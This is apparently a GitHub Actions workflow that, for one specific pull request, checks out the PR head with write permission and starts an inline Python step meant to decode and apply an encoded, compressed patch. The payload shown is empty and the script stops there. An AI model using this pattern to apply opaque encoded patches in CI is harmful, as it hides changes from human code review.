name: Piano Pinned Patch Verification
on:
  pull_request:
    paths:
      - '.github/workflows/piano-local-verification-source.yml'
permissions:
  contents: read
jobs:
  verify-patch:
    if: github.event.pull_request.number == 81 && github.event.pull_request.head.repo.full_name == github.repository && github.event.pull_request.head.ref == 'fix/piano-unison-decay-envelope'
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: write
    env:
      PYTHONPATH: skills/code-composer/kit/src
      OPENBLAS_NUM_THREADS: '1'
      EXPECTED_HEAD: ${{ github.event.pull_request.head.sha }}
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
          cache: pip
      - name: Apply SHA-pinned locally tested patch
        shell: bash
        run: |
          set -euo pipefail
          test "$(git rev-parse HEAD)" = "$EXPECTED_HEAD"
          python - <<'PY'
          import base64, hashlib, os, pathlib, subprocess, zlib
          payload=''
          PY
